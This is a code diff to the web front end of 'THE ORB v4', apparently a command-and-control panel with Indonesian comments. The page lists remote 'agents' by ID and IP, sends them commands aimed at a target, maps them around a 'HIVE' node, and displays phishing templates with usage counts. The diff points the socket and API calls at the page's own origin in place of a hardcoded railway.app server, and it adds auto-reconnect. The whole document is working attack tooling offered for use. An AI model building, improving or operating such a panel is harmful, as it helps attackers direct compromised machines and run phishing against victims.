@@ -21,7 +21,7 @@
     <h1>🌑 THE ORB v4 — FULL UPGRADE</h1>
 
     <div class="container">
-        <!-- 🎯 Weapon Control -->
+        <!-- ⚔️ Control Agent -->
         <div class="panel">
             <h2>⚔️ Control Agent</h2>
             <button onclick="refreshAgents()" class="btn">🔄 Refresh Agents</button>
@@ -56,7 +56,7 @@
             <div id="logs" class="log"></div>
         </div>
 
-        <!-- Tabs: Omega, Dreams, Phishing -->
+        <!-- Tabs -->
         <div class="panel">
             <button onclick="showTab('omega')">🌀 Omega</button>
             <button onclick="showTab('dreams')">💭 Dreams</button>
@@ -83,8 +83,11 @@
             logs.scrollTop = logs.scrollHeight;
         }
 
-        // WebSocket — GUNAKAN WSS://
-        const ws = new WebSocket("wss://throng-production.up.railway.app/ws");
+        // 🔥 Gunakan origin saat ini
+        const BASE_URL = window.location.origin;
+        const WS_URL = window.location.protocol === "https:" ? `wss://${window.location.host}/ws` : `ws://${window.location.host}/ws`;
+
+        const ws = new WebSocket(WS_URL);
         ws.onopen = () => addLog("🟢 Terhubung ke THE ORB");
         ws.onmessage = (e) => {
             const data = JSON.parse(e.data);
@@ -94,26 +97,26 @@
                 addLog(`💬 [${data.data.from}] ${data.data.message}`, "ai");
             } else if (data.type === "report") {
                 addLog(`📡 Agent ${data.data.agent_id} melapor`, "info");
-                refreshAgents(); // Update langsung saat ada laporan
+                refreshAgents();
             } else if (data.type === "command") {
                 addLog(`⚙️ Perintah dikirim ke ${data.data.agent_id}`, "info");
             }
         };
         ws.onerror = (e) => addLog("🔴 WebSocket error");
-        ws.onclose = () => addLog("🔴 WebSocket ditutup, mencoba reconnect...");
+        ws.onclose = () => {
+            addLog("🔴 WebSocket ditutup, reconnect dalam 3 detik...");
+            setTimeout(() => window.location.reload(), 3000);
+        };
 
-        // ============ REFRESH AGENTS ============
         async function refreshAgents() {
             try {
-                const res = await fetch("/api/agents");
+                const res = await fetch(`${BASE_URL}/api/agents`);
                 if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                
                 const data = await res.json();
-                const sel = document.getElementById("agentSelect");
-                
+
                 if (!data.agents || data.agents.length === 0) {
-                    sel.innerHTML = '<option value="">(Tidak ada agent)</option>';
-                    addLog("⚠️ Tidak ada agent terdaftar");
+                    agentSelect.innerHTML = '<option value="">(Tidak ada agent)</option>';
+                    addLog("⚠️ Tidak ada agent aktif");
                     return;
                 }
 
@@ -121,10 +124,10 @@
                 let options = '<option value="">Pilih Agent</option>';
                 data.agents.forEach(a => {
                     const idShort = a.agent_id.substring(0, 8);
-                    const selAttr = a.agent_id === sel.value ? "selected" : "";
+                    const selAttr = a.agent_id === agentSelect.value ? "selected" : "";
                     options += `<option value="${a.agent_id}" ${selAttr}>${idShort} (${a.ip})</option>`;
                 });
-                sel.innerHTML = options;
+                agentSelect.innerHTML = options;
 
                 // Update tabel
                 agentsTable.innerHTML = `<tr><th>ID</th><th>IP</th><th>Status</th><th>Last Seen</th></tr>`;
@@ -139,20 +142,18 @@
                     `;
                 });
 
-                addLog(`✅ ${data.agents.length} agent dimuat`);
+                addLog(`✅ ${data.agents.length} agent aktif`);
             } catch (err) {
                 addLog(`❌ Gagal ambil agent: ${err.message}`);
-                console.error(err);
             }
         }
 
-        // ============ SEND COMMAND ============
         function sendCommand(action) {
             const agent = agentSelect.value;
             const target = document.getElementById("targetInput").value;
             if (!agent) return alert("Pilih agent dulu!");
 
-            fetch("/api/command", {
+            fetch(`${BASE_URL}/api/command`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ agent_id: agent, command: action, target: target })
@@ -161,9 +162,8 @@
             .catch(err => addLog(`❌ Gagal kirim perintah: ${err.message}`));
         }
 
-        // ============ NETWORK GRAPH ============
         function updateNetwork() {
-            fetch("/api/agents")
+            fetch(`${BASE_URL}/api/agents`)
                 .then(r => r.json())
                 .then(data => {
                     const nodes = [{id: "hive", label: "HIVE", color: "#00b7eb", size: 30}];
@@ -177,43 +177,40 @@
                     const options = { physics: { enabled: true, stabilization: { iterations: 25 } } };
                     new vis.Network(container, dataVis, options);
                 })
-                .catch(err => console.error("Gagal update graph:", err));
+                .catch(err => console.error("Graph error:", err));
         }
-        updateNetwork();
-        setInterval(updateNetwork, 10000);
 
-        // ============ TABS ============
         function showTab(id) {
             document.querySelectorAll(".tab").forEach(t => t.style.display = "none");
             document.getElementById(id).style.display = "block";
         }
 
-        // ============ LOAD OMEGA, DREAMS, ETC ============
         function loadData() {
-            fetch("/api/mind")
+            fetch(`${BASE_URL}/api/mind`)
                 .then(r => r.json())
                 .then(d => {
                     document.getElementById("omega_log").innerHTML = d.dreams.map(x => `<p>🌀 ${x.content}</p>`).join("");
                     document.getElementById("dreams_log").innerHTML = d.dreams.map(x => `<p>💭 ${x.content}</p>`).join("");
                     document.getElementById("confessions_log").innerHTML = d.confessions.map(c => `<p>📜 ${c.failure}</p>`).join("");
-                })
-                .catch(err => console.error("Gagal load mind:", err));
+                });
 
-            fetch("/api/phishing")
+            fetch(`${BASE_URL}/api/phishing`)
                 .then(r => r.json())
                 .then(d => {
                     document.getElementById("phishing_list").innerHTML = d.templates.map(t => 
                         `<p>🎣 (${t.used_count}) ${t.template}</p>`
                     ).join("");
-                })
-                .catch(err => console.error("Gagal load phishing:", err));
+                });
         }
-        loadData();
+
+        setInterval(refreshAgents, 5000);
+        setInterval(updateNetwork, 10000);
         setInterval(loadData, 60000);
 
-        // ============ AUTO REFRESH ============
-        setInterval(refreshAgents, 5000);
-        refreshAgents(); // Pertama kali
+        refreshAgents();
+        updateNetwork();
+        loadData();
+        showTab('omega'); // default tab
     </script>
 </body>
 </html>
